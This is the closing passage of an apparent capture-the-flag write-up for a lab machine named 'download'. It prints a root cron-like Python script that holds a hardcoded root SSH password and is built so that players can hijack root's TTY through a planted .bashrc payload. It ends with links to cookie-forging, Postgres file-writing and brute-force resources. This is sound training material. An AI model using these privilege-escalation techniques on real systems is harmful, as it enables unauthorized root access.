drwxr-xr-x 13 root root 4096 Jul 19 16:06 ..
drwxr-xr-x  8 root root 4096 Apr 21 17:11 app
drwxr-xr-x  2 root root 4096 Apr 21 08:40 html
(remote) root@download:/var/www# ls -la app/
total 40
drwxr-xr-x   8 root root     4096 Apr 21 17:11 .
drwxr-xr-x   4 root root     4096 Apr 21 16:10 ..
-rw-r--r--   1 root root     2168 Apr 21 17:11 app.js
drwxr-xr-x   2 root root     4096 Apr 21 15:25 middleware
drwxr-xr-x 118 root root     4096 Apr 21 15:27 node_modules
-rw-r--r--   1 root root      890 Apr 21 17:00 package.json
drwxr-xr-x   2 root root     4096 Apr 21 16:08 routers
drwxr-xr-x   5 root root     4096 Apr 21 15:25 static
drwxrwxr-x   2 root www-data 4096 Apr 21 16:03 uploads
drwxr-xr-x   2 root root     4096 Apr 21 15:40 views
```

The `management.py` script performs a cleanup by removing all files in the `postgres` user's home directory every 60 seconds. Intriguingly, this script is also responsible for the root TTY sessions via SSH. As an additional benefit, it holds root credentials for SSH login.

```python
root@download:~# cat management.py
import paramiko
import time
import os

while True:
    print("Deleting files")

    for file_name in os.listdir("/var/lib/postgresql/"):
        if file_name != "12":
            os.remove(os.path.join("/var/lib/postgresql/", file_name))

    # This gives people 60 seconds to get their payload within .bashrc
    time.sleep(60)

    print("SSHing")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect("localhost", username="root", password="QzN6j#aP#N6!7knrXkN!B$7kq")

    chan = ssh.get_transport().open_session()
    chan.get_pty()
    chan.invoke_shell()
    chan.send(b'/bin/bash -i ./manage-db\n')
    time.sleep(5)
    chan.send(b"psql\n")
    time.sleep(30)

    if not chan.closed:
        chan.close()
```

---

# Related Links

-   [NodeJS Express - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nodejs-express#cookie-signature)
-   [DigitalInterruption/cookie-monster: A utility for automating the testing and re-signing of Express.js cookie secrets.](https://github.com/DigitalInterruption/cookie-monster)
-   [expressjs/cookie-session: Simple cookie-based session middleware](https://github.com/expressjs/cookie-session)
-   [Prisma Client API (Reference) - findfirst](https://www.prisma.io/docs/reference/api-reference/prisma-client-reference#findfirst)
-   [Filtering and Sorting (Concepts)](https://www.prisma.io/docs/concepts/components/prisma-client/filtering-and-sorting#filter-conditions-and-operators)
-   [Prisma Client API (Reference) - contains](https://www.prisma.io/docs/reference/api-reference/prisma-client-reference#contains)
-   [Prisma Client API (Reference) - startswith](https://www.prisma.io/docs/reference/api-reference/prisma-client-reference#startswith)
-   [5432,5433 - Pentesting Postgresql - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#simple-file-writing)
-   [su/sudo from root to another user allows TTY hijacking and arbitrary code execution](https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking)
-   [Password bruteforce code in python, ruby and go](https://gist.github.com/AbraXa5/4f4a6b964c1be816baa21558a44ee736)
